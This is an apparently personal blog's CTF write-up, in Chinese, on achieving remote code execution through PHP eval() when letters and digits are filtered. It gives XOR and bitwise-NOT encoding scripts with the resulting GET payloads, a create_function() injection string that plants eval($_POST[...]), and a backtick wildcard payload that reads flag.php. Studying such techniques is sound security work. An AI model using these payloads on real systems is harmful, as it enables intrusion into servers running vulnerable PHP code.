@@ -1,0 +1,264 @@
+<html>
+<head>
+    <meta charset="utf-8"/>
+<meta name="description" content=""/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<title>CTF WEB 苛刻条件RCE | Xing-Fax</title>
+
+<link rel="shortcut icon" href="https://Xing-Fax.GitHub.io/favicon.ico?v=1699016659770">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://Xing-Fax.GitHub.io/styles/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css">
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.15.10/languages/dart.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script>
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <div class="navbar-brand">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            Xing-Fax
+        </div>
+    </div>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+                <div class="nav-item">
+                    
+                        <a href="/" class="menu gt-a-link">
+                            首页
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/archives" class="menu gt-a-link">
+                            归档
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/tags" class="menu gt-a-link">
+                            标签
+                        </a>
+                    
+                </div>
+            
+                <div class="nav-item">
+                    
+                        <a href="/post/about" class="menu gt-a-link">
+                            关于
+                        </a>
+                    
+                </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1699016659770" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    CTF WEB 苛刻条件RCE
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2023-07-16 ·
+                    </time>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/php/" class="post-tags">
+                            # PHP
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/web/" class="post-tags">
+                            # WEB
+                        </a>
+                    
+                        <a href="https://Xing-Fax.GitHub.io/tag/ctf/" class="post-tags">
+                            # CTF
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="苛刻条件rce">苛刻条件RCE</h1>
+  <!-- more -->  
+<pre><code class="language-php">&lt;?php
+if(isset($_GET['code'])){
+    $code = $_GET['code'];
+    if(preg_match(&quot;/[a-z0-9]+/i&quot;,$code)){
+        die(&quot;NO.&quot;);
+    }
+    eval($code);
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>在上述代码中，对传入参数“code”进行了严格的过滤，参数中不能出现字母和数字(含大小写)</p>
+<p>可以使用PHP中的位运算来对参数进行异或处理</p>
+<pre><code class="language-php">&lt;?php
+$a = &quot;&lt;str&gt;&quot;;	//要异或的字符串
+
+for($i = 0; $i &lt; strlen($a); $i++){
+    echo &quot;%&quot;.dechex(ord($a[$i])^0xff);
+}
+echo &quot;^&quot;;
+for($i = 0; $i &lt; strlen($a); $i++){
+    echo &quot;%ff&quot;;
+}
+?&gt;
+</code></pre>
+<p>通过以上代码将&quot;system(ls)&quot;运算为</p>
+<pre><code>(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%93%8c^%ff%ff);
+</code></pre>
+<p>GET:</p>
+<pre><code>http://localhost/test.php?code=(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%93%8c^%ff%ff);
+</code></pre>
+<p>同理，通过取反也可以达到相同效果</p>
+<pre><code class="language-php">&lt;?php
+$a = &quot;&lt;str&gt;&quot;;	//要取反的字符串
+echo &quot;~(&quot;;
+for($i = 0;$i &lt; strlen($a); $i++){
+    echo &quot;%&quot;.bin2hex(~$a[$i]);
+}
+echo &quot;)&quot;;
+?&gt;
+</code></pre>
+<pre><code>http://localhost/test.php?code=(~(%8c%86%8c%8b%9a%92))(~(%93%8c));
+</code></pre>
+<h2 id="create_function">Create_Function</h2>
+<p>create_function()函数有两个参数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>r</mi><mi>g</mi><mi>s</mi><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">args和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">和</span></span></span></span>code，用于创建一个lambda样式的函数</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+$f = create_function('$a, $b', 'return($a + $b);');
+echo $f(1,2);
+// 3
+</code></pre>
+<p>但是在创建函数的过程中存在一个代码注入</p>
+<pre><code class="language-php">$code = &quot;return($a + $b);}eval($_POST['Y1']);//&quot;
+$f = create_function('$a, $b', $code);
+</code></pre>
+<p>相当于得到</p>
+<pre><code class="language-php">function f($a, $b){
+	return($a + $b);
+}
+eval($POSY['Y1']);//}
+</code></pre>
+<p>在注入的过程中，先使用 } 闭合函数体，在写入注入自己的代码，由于末尾多出一个 } 所以使用注释符注释掉</p>
+<h2 id="例题">例题</h2>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+//flag.php
+if(Isset($_GET['code'])){
+    $code = $_GET['code'];
+    if(strlen($code) &gt; 18){
+        die(&quot;No,1&quot;);
+    }
+    if(preg_match(&quot;/\w/&quot;,$code)){
+        die(&quot;NO,2&quot;);
+    }
+    if(preg_match(&quot;/&amp;||\||\^|\~|\!/&quot;,$code)){
+        die(&quot;NO,3&quot;);
+    }
+    if(preg_match(&quot;/\(|\)/&quot;,$code)){
+        die(&quot;NO,4&quot;);
+    }
+    if(preg_match(&quot;/|{|\}|\[|\]/&quot;,$code)){
+        die(&quot;NO,5&quot;);
+    }
+    if(preg_match(&quot;/||$|@|\./&quot;,$code)){
+        die(&quot;NO,6&quot;);
+    }
+    eval($code);
+}else{
+    show_source(__FILE__);
+}
+?&gt;
+</code></pre>
+<p>GET:</p>
+<pre><code>http://localhost/test.php?code=?&gt;&lt;?=`/???/???%20*`;
+</code></pre>
+<p>&quot;?&gt;&quot; 表示PHP的结束符，而“&lt;?=”表示下一个PHP的开始“=”表示echo回显，反引号表示shell__exec()</p>
+<p>?表示单个长度的字符，*表示所有字符，能够匹配到的路径为“/bin/cat *”</p>
+<pre><code class="language-php">echo shell_exec(&quot;/???/??? *&quot;)		// /bin/cat flag.php
+</code></pre>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://Xing-Fax.GitHub.io/post/md5/" class="post-title gt-a-link">
+                    CTF WEB MD5绕过
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温故而知新，可以为师矣~</div>
+    <div class="social-container">
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Website BY <a href="https://github.com/Xing-Fax/" target="_blank">Xing-Fax</a> Powered BY <a
+                href="https://github.com/Xing-Fax/xing-fax.github.io/" target="_blank">GitHub | <a href="https://xing-fax.github.io/atom.xml" target="_blank">RSS</a></a>
+    </div>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
